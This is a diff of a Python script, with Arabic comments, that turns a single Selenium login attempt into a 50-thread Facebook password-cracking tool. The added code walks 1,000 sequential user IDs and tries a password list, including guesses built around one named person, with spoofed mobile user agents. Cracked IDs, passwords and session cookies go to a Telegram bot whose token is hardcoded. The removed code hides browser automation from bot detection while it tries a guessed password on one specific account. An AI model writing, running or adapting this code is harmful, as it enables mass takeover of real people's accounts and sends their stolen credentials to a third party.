@@ -1,73 +1,75 @@
-import time
-import random
-import requests
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.chrome.service import Service
-from selenium.webdriver.common.by import By
-from webdriver_manager.chrome import ChromeDriverManager
+import os, sys, time, random, requests, threading
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from bs4 import BeautifulSoup
+from PIL import Image, ImageDraw
 
+# 🔑 بيانات التليجرام
 TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
 CHAT_ID = "5653032481"
 
-def send_msg(text):
-    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': text})
+# 📋 قائمة كلمات مرور محتملة (2004-2005) وتخمينات شائعة
+PASS_LIST = [
+    '123456', '12345678', '123456789', 'jasser123', 'malo123', 'jasser2004', 'jasser2005',
+    'password', '123123', '112233', '445566', '778899', '000000', '111111', '12345',
+    'facebook', 'fbfb123', 'love123', 'king123', 'admin123', 'user123', '1234567',
+    '20042004', '20052005', '987654321', '654321', '321321', '1234567890'
+] + [f'jasser{i}' for i in range(2000, 2010)] + [f'malo{i}' for i in range(2000, 2010)]
 
-def human_type(element, text):
-    """محاكاة الكتابة البشرية حرف بحرف"""
-    for char in text:
-        element.send_keys(char)
-        time.sleep(random.uniform(0.1, 0.3)) # تأخير عشوائي بين الحروف
+def send_to_tg(status, uid, pas, cookie=""):
+    msg = f"🔔 {status}\n🆔 ID: {uid}\n🔑 PASS: {pas}\n🍪 COOKIE: {cookie}"
+    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': msg})
 
-def run_bot():
-    send_msg("🕵️ جاري الدخول بوضع 'التخفي البشري' لتجنب الكابتشا...")
+def get_ua():
+    """بصمة جهاز متطورة"""
+    and_v = random.choice(['9', '10', '11', '12'])
+    model = random.choice(['SM-G960F', 'SM-A515F', 'RMX2001', 'M2003J15SC'])
+    return f"Mozilla/5.0 (Linux; Android {and_v}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80, 120)}.0.0.0 Mobile Safari/537.36"
+
+def crack_engine(uid):
+    """محرك الفحص: يجرب كل كلمات المرور على حساب واحد"""
+    session = requests.Session()
+    login_url = "https://m.facebook.com/login.php" # استخدام واجهة الموبايل لسرعة العمليات المتعددة
     
-    options = Options()
-    options.add_argument('--headless')
-    options.add_argument('--no-sandbox')
-    options.add_argument('--disable-dev-shm-usage')
-    options.add_argument('--window-size=1080,1920')
+    for pas in PASS_LIST:
+        try:
+            head = {
+                'User-Agent': get_ua(),
+                'Accept-Language': 'ar-DZ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            }
+            # جلب الحقول المخفية
+            r = session.get(login_url, headers=head, timeout=15)
+            soup = BeautifulSoup(r.text, 'html.parser')
+            form_data = {i.get("name"): i.get("value") for i in soup.find_all("input", {"type": "hidden"})}
+            
+            form_data.update({"email": uid, "pass": pas})
+            
+            # إرسال الدخول
+            res = session.post(login_url, data=form_data, headers=head, allow_redirects=False, timeout=15)
+            
+            if 'c_user' in session.cookies:
+                cookie = ";".join([f"{k}={v}" for k, v in session.cookies.items()])
+                print(f"\r✅ OK: {uid} | {pas}")
+                send_to_tg("✅ حساب ناجح (OK)", uid, pas, cookie)
+                break # توقف عند النجاح
+            
+            elif 'checkpoint' in res.headers.get('Location', ''):
+                print(f"\r⚠️ CP: {uid} | {pas}")
+                send_to_tg("⚠️ نقطة تفتيش (CP)", uid, pas)
+                break # توقف عند الوصول لنقطة تفتيش
+                
+        except:
+            continue
+    print(f"\r[+] انتهى فحص {uid}", end="")
+
+def run_main():
+    start_id = 26701173 # الايدي المطلوب التوليد عليه
+    total_ids = 1000 # عدد الحسابات التي سيتم توليدها وفحصها
     
-    # 🕵️ حيل سحرية لإخفاء هوية البوت:
-    options.add_argument('--disable-blink-features=AutomationControlled')
-    options.add_experimental_option("excludeSwitches", ["enable-automation"])
-    options.add_experimental_option('useAutomationExtension', False)
-    options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
-
-    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
+    print(f"🚀 بدء العمليات المتعددة على المعرف {start_id}...")
+    ids_to_check = [str(start_id + i) for i in range(total_ids)]
     
-    # تنفيذ كود لإزالة علامة الـ webdriver من المتصفح
-    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => False})")
-
-    try:
-        driver.get("https://www.facebook.com")
-        time.sleep(random.uniform(4, 7)) # انتظار عشوائي كأن الشخص يقرأ الصفحة
-        
-        # إدخال البريد بطريقة بشرية
-        email_field = driver.find_element(By.ID, "email")
-        human_type(email_field, "61583389620613")
-        time.sleep(random.uniform(1, 3))
-        
-        # إدخال كلمة المرور بطريقة بشرية
-        pass_field = driver.find_element(By.ID, "pass")
-        human_type(pass_field, "jasser malo")
-        time.sleep(random.uniform(1, 2))
-        
-        # النقر على زر الدخول
-        login_btn = driver.find_element(By.NAME, "login")
-        login_btn.click()
-        
-        send_msg("⏳ تم إرسال البيانات.. ننتظر لنرى هل تم خداع النظام!")
-        time.sleep(10)
-        
-        driver.save_screenshot("result.png")
-        with open("result.png", 'rb') as f:
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data={'chat_id': CHAT_ID, 'caption': "📸 النتيجة بعد محاولة التخفي"}, files={'photo': f})
-
-    except Exception as e:
-        send_msg(f"❌ خطأ: {str(e)}")
-    finally:
-        driver.quit()
+    with ThreadPool(max_workers=50) as pool: # 50 عملية في وقت واحد
+        pool.map(crack_engine, ids_to_check)
 
 if __name__ == "__main__":
-    run_bot()
+    run_main()
